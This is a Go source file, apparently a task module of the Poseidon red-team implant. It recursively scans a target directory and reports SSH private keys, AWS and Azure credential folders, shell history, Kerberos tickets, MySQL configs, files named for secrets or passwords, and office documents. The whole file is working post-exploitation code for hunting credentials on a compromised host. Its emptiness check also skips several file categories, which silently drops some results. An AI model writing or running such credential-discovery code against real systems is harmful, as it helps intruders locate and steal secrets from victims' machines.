package triagedirectory

import (
	"encoding/json"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

type OSFile struct {
	Path             string `json:"path"`
	Name             string `json:"name"`
	Size             int64  `json:"size"`
	Mode             string `json:"mode"`
	ModificationTime string `json:"modification_time"`
	IsDir            bool   `json:"is_dir"`
}

type DirectoryTriageResult struct {
	mutex             sync.Mutex
	AzureFiles        []OSFile `json:"azure_files"`
	AWSFiles          []OSFile `json:"aws_files"`
	SSHFiles          []OSFile `json:"ssh_files"`
	MSWordFiles       []OSFile `json:"msword_files"`
	MSExcelFiles      []OSFile `json:"msexcel_files"`
	MSPowerPointFiles []OSFile `json:"mspptx_files"`
	HistoryFiles      []OSFile `json:"history_files"`
	PDFs              []OSFile `json:"pdfs"`
	LogFiles          []OSFile `json:"log_files"`
	ShellScriptFiles  []OSFile `json:"shellscript_files"`
	YAMLFiles         []OSFile `json:"yaml_files"`
	ConfFiles         []OSFile `json:"conf_files"`
	CSVFiles          []OSFile `json:"csv_files"`
	DatabaseFiles     []OSFile `json:"db_files"`
	MySqlConfFiles    []OSFile `json:"mysql_confs"`
	KerberosFiles     []OSFile `json:"kerberos_tickets"`
	TextFiles         []OSFile `json:"text_files"`
	InterestingFiles  []OSFile `json:"interesting_files"`
}

func NewDirectoryTriageResult() *DirectoryTriageResult {
	mtx := sync.Mutex{}
	return &DirectoryTriageResult{
		mutex: mtx,
	}
}

func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}

	// do whatever here
	tMsg.TaskItem = task
	// log.Println("Task params:", string(task.Params))

	// log.Println("Parsed task params!")
	if len(task.Params) == 0 {
		tMsg.TaskResult = []byte("Error: No path given.")
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}
	result := NewDirectoryTriageResult()
	err := triageDirectory(task.Params, result)
	// fmt.Println(result)
	if err != nil {
		// fmt.Println("Error was not nil!", err.Error())
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
	} else {
		if !isDirectoryTriageResultEmpty(*result) {
			data, err := json.MarshalIndent(result, "", "    ")
			// // fmt.Println("Data:", string(data))
			if err != nil {
				// fmt.Println("Error was not nil when marshalling!", err.Error())
				tMsg.TaskResult = []byte(err.Error())
				tMsg.Error = true
			} else {
				// fmt.Println("Sending on up the data:\n", string(data))
				tMsg.TaskResult = data
				tMsg.Error = false
			}
		} else {
			tMsg.TaskResult = []byte("Task completed.")
			tMsg.Error = false
		}
	}
	threadChannel <- tMsg
}

func isDirectoryTriageResultEmpty(result DirectoryTriageResult) bool {
	return len(result.AWSFiles) == 0 && len(result.SSHFiles) == 0 && len(result.AzureFiles) == 0 && len(result.HistoryFiles) == 0 && len(result.LogFiles) == 0 && len(result.ShellScriptFiles) == 0 && len(result.YAMLFiles) == 0 && len(result.ConfFiles) == 0 && len(result.CSVFiles) == 0 && len(result.DatabaseFiles) == 0 && len(result.MySqlConfFiles) == 0 && len(result.KerberosFiles) == 0 && len(result.InterestingFiles) == 0
}

func newOSFile(path string, info os.FileInfo) OSFile {
	return OSFile{
		Path:             path,
		Name:             info.Name(),
		Size:             info.Size(),
		Mode:             info.Mode().Perm().String(),
		ModificationTime: info.ModTime().String(),
		IsDir:            info.IsDir(),
	}
}

// Helper function to add an OS file to a slice of OS Files.
func addFileToSlice(slice *[]OSFile, path string, info os.FileInfo) {
	*slice = append(*slice, newOSFile(path, info))
}

func anySliceInString(s string, slice []string) bool {
	for _, x := range slice {
		if strings.Contains(s, x) {
			return true
		}
	}
	return false
}

func addFileToDirectoryTriageResult(filepath string, info os.FileInfo, result *DirectoryTriageResult, slice *[]OSFile) {
	result.mutex.Lock()
	addFileToSlice(slice, filepath, info)
	result.mutex.Unlock()
}

var interestingNames = []string{"secret", "password", "credential"}

// Triage a specified home-path for interesting files, including:
// See: DirectoryTriageResult
func triageDirectory(triagePath string, result *DirectoryTriageResult) error {
	if _, err := os.Stat(triagePath); os.IsNotExist(err) {
		return err
	}

	files, err := ioutil.ReadDir(triagePath)
	if err != nil {
		return err
	}
	wg := sync.WaitGroup{}
	for _, file := range files {
		fullpath := filepath.Join(triagePath, file.Name())
		if file.IsDir() {
			if anySliceInString(file.Name(), interestingNames) {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.InterestingFiles)
			}
			wg.Add(1)
			go func(path string, dirtriage *DirectoryTriageResult) {
				defer wg.Done()
				triageDirectory(path, dirtriage)
			}(fullpath, result)
		} else {
			if strings.Contains(fullpath, string(os.PathSeparator)+".ssh"+string(os.PathSeparator)) {
				switch file.Name() {
				case "authorized_keys":
					break
				case "known_hosts":
					break
				default:
					addFileToDirectoryTriageResult(fullpath, file, result, &result.SSHFiles)
					// addFileToSlice(&result.SSHFiles, fullpath, file)
					break
				}
				// Add any file within the AWS directory.
			} else if strings.Contains(fullpath, string(os.PathSeparator)+".aws"+string(os.PathSeparator)) {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.AWSFiles)
				// addFileToSlice(&result.AWSFiles, fullpath, file)
				// Add all history files.
			} else if strings.HasSuffix(file.Name(), "_history") && strings.HasPrefix(file.Name(), ".") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.HistoryFiles)
				// addFileToSlice(&result.HistoryFiles, fullpath, file)
				// Add all shell-script files.
			} else if strings.HasSuffix(file.Name(), ".sh") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.ShellScriptFiles)
				// addFileToSlice(&result.ShellScriptFiles, fullpath, file)
				// Add all yaml files.
			} else if strings.HasSuffix(file.Name(), ".yml") || strings.HasSuffix(file.Name(), ".yaml") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.YAMLFiles)
				// addFileToSlice(&result.YAMLFiles, fullpath, file)
				// Add all configuration files.
			} else if strings.HasSuffix(file.Name(), ".conf") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.ConfFiles)
				// addFileToSlice(&result.ConfFiles, fullpath, file)
				// Any "interesting" file names.
			} else if anySliceInString(file.Name(), interestingNames) {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.InterestingFiles)
				// addFileToSlice(&result.InterestingFiles, fullpath, file)
				// Any kerberos files.
			} else if strings.HasPrefix(file.Name(), "krb5") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.KerberosFiles)
				// addFileToSlice(&result.KerberosFiles, fullpath, file)
				// Any MySQL configuration files.
			} else if file.Name() == ".my.cnf" || file.Name() == "my.cnf" {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.MySqlConfFiles)
				// addFileToSlice(&result.MySqlConfFiles, fullpath, file)
				// Any azure files
			} else if strings.Contains(fullpath, string(os.PathSeparator)+".azure"+string(os.PathSeparator)) {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.AzureFiles)
				// addFileToSlice(&result.AzureFiles, fullpath, file)
			} else if strings.HasSuffix(file.Name(), ".log") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.LogFiles)
				// addFileToSlice(&result.LogFiles, fullpath, file)
			} else if strings.HasSuffix(file.Name(), ".csv") || strings.HasSuffix(file.Name(), ".tsv") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.CSVFiles)
				// addFileToSlice(&result.CSVFiles, fullpath, file)
			} else if strings.HasSuffix(file.Name(), ".db") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.DatabaseFiles)
				// addFileToSlice(&result.DatabaseFiles, path, info)
			} else if strings.HasSuffix(file.Name(), ".doc") || strings.HasSuffix(file.Name(), ".docx") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.MSWordFiles)
				// addFileToSlice(&result.DatabaseFiles, path, info)
			} else if strings.HasSuffix(file.Name(), ".xls") || strings.HasSuffix(file.Name(), ".xlsx") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.MSExcelFiles)
				// addFileToSlice(&result.DatabaseFiles, path, info)
			} else if strings.HasSuffix(file.Name(), ".ppt") || strings.HasSuffix(file.Name(), ".pptx") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.MSPowerPointFiles)
				// addFileToSlice(&result.DatabaseFiles, path, info)
			} else if strings.HasSuffix(file.Name(), ".txt") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.TextFiles)
				// addFileToSlice(&result.DatabaseFiles, path, info)
			} else if strings.HasSuffix(file.Name(), ".pdf") {
				addFileToDirectoryTriageResult(fullpath, file, result, &result.PDFs)
				// addFileToSlice(&result.DatabaseFiles, path, info)
			}
		}
	}

	wg.Wait()
	return nil
}
